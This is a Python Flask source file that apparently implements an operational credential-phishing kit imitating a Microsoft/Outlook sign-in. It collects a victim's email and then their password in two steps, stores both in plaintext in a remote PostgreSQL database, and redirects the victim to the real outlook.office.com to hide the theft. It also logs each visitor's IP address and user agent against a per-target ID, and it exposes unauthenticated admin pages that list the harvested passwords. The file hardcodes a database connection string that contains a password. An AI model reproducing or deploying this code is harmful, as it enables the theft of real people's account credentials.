from flask import Flask, request, render_template, redirect, session
import psycopg2
from psycopg2.extras import RealDictCursor
from datetime import datetime

app = Flask(__name__)
app.secret_key = "ceci_est_une_clé_secrète_à_modifier"

DATABASE_URL = "postgresql://admin:wRGvLO4UKrNf7Uq7t0nbXoDTpKPkL4rJ@dpg-cvufunmuk2gs738bgifg-a.frankfurt-postgres.render.com/logins_pezw"

def get_db():
    return psycopg2.connect(DATABASE_URL, cursor_factory=RealDictCursor)

def init_db():
    with get_db() as conn:
        with conn.cursor() as c:
            c.execute("""
                CREATE TABLE IF NOT EXISTS logins (
                    id SERIAL PRIMARY KEY,
                    timestamp TEXT,
                    email TEXT,
                    password TEXT
                )
            """)
            c.execute("""
                CREATE TABLE IF NOT EXISTS visits (
                    id SERIAL PRIMARY KEY,
                    timestamp TEXT,
                    ip TEXT,
                    user_agent TEXT
                )
            """)
            c.execute("ALTER TABLE logins ADD COLUMN IF NOT EXISTS user_id TEXT")
            c.execute("ALTER TABLE visits ADD COLUMN IF NOT EXISTS user_id TEXT")
        conn.commit()

@app.before_request
def track_visit():
    if request.endpoint not in ("static",):
        user_id = request.args.get("id", "inconnu")
        with get_db() as conn:
            with conn.cursor() as c:
                c.execute(
                    "INSERT INTO visits (timestamp, ip, user_agent, user_id) VALUES (%s, %s, %s, %s)",
                    (
                        datetime.now().isoformat(timespec='seconds'),
                        request.remote_addr,
                        request.headers.get("User-Agent"),
                        user_id
                    )
                )
            conn.commit()

@app.route("/", methods=["GET"])
def home():
    return render_template("index.html")

@app.route("/log", methods=["POST"])
def step1():
    email = request.form.get("email")
    timestamp = datetime.now().isoformat(timespec='seconds')
    user_id = request.args.get("id", "inconnu")

    session["email"] = email
    session["timestamp"] = timestamp
    session["user_id"] = user_id

    with get_db() as conn:
        with conn.cursor() as c:
            c.execute(
                "INSERT INTO logins (timestamp, email, password, user_id) VALUES (%s, %s, %s, %s)",
                (timestamp, email, "", user_id)
            )
        conn.commit()

    return render_template("password.html", email=email)

@app.route("/final", methods=["POST"])
def step2():
    email = session.get("email", "non_renseigné")
    timestamp = session.get("timestamp")
    password = request.form.get("password")

    with get_db() as conn:
        with conn.cursor() as c:
            c.execute("""
                UPDATE logins SET password = %s
                WHERE timestamp = %s AND email = %s AND password = ''
            """, (password, timestamp, email))
        conn.commit()

    session.clear()
    return redirect("https://outlook.office.com")

@app.route("/recap", methods=["GET"])
def recap():
    page = int(request.args.get("page", 1))
    per_page = 20
    offset = (page - 1) * per_page

    with get_db() as conn:
        with conn.cursor() as c:
            c.execute("SELECT COUNT(*) FROM logins")
            total = c.fetchone()["count"]

            c.execute("SELECT timestamp, email, password, user_id FROM logins ORDER BY id DESC LIMIT %s OFFSET %s", (per_page, offset))
            rows = c.fetchall()

    html = "<h2>Récapitulatif des tentatives</h2><table border='1'><tr><th>Horodatage</th><th>Email</th><th>Mot de passe</th><th>PC</th></tr>"
    for row in rows:
        html += f"<tr><td>{row['timestamp']}</td><td>{row['email']}</td><td>{row['password']}</td><td>{row['user_id']}</td></tr>"
    html += "</table><br><div>Pages : "
    total_pages = (total + per_page - 1) // per_page
    for i in range(1, total_pages + 1):
        if i == page:
            html += f"<strong>{i}</strong> "
        else:
            html += f"<a href='/recap?page={i}'>{i}</a> "
    html += "</div>"
    return html

@app.route("/visites", methods=["GET"])
def visites():
    page = int(request.args.get("page", 1))
    per_page = 20
    offset = (page - 1) * per_page

    with get_db() as conn:
        with conn.cursor() as c:
            c.execute("SELECT COUNT(*) FROM visits")
            total = c.fetchone()["count"]

            c.execute("SELECT timestamp, ip, user_agent, user_id FROM visits ORDER BY id DESC LIMIT %s OFFSET %s", (per_page, offset))
            rows = c.fetchall()

    html = "<h2>Dernières visites</h2><table border='1'><tr><th>Horodatage</th><th>IP</th><th>User-Agent</th><th>PC</th></tr>"
    for row in rows:
        html += f"<tr><td>{row['timestamp']}</td><td>{row['ip']}</td><td>{row['user_agent']}</td><td>{row['user_id']}</td></tr>"
    html += "</table><br><div>Pages : "
    total_pages = (total + per_page - 1) // per_page
    for i in range(1, total_pages + 1):
        if i == page:
            html += f"<strong>{i}</strong> "
        else:
            html += f"<a href='/visites?page={i}'>{i}</a> "
    html += "</div>"
    return html

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000)
